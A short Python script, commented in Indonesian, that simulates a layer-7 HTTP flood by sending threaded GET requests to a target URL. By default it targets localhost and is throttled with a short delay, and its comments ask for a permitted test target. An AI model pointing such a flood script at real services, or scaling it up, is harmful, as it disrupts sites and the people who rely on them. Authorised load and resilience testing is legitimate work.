import requests
import time
import threading

def make_request(url):
    try:
        response = requests.get(url)
        print(f"Permintaan dikirim. Status kode: {response.status_code}")
    except requests.RequestException as e:
        print(f"Terjadi kesalahan saat mengirim permintaan: {e}")

def simulate_layer7_attack(url, num_requests, threads=5):
    threads_list = []

    for _ in range(num_requests):
        t = threading.Thread(target=make_request, args=(url,))
        t.start()
        threads_list.append(t)
        if len(threads_list) >= threads:
            for t in threads_list:
                t.join()
            threads_list = []
        time.sleep(0.1)  # Penundaan kecil untuk tidak membanjiri server

    for t in threads_list:
        t.join()

if __name__ == "__main__":
    target_url = "http://localhost/test"  # Ganti dengan URL yang Anda izinkan untuk diuji
    number_of_requests = 1000  # Jumlah permintaan yang sangat banyak, sesuaikan dengan kebutuhan simulasi

    simulate_layer7_attack(target_url, number_of_requests)
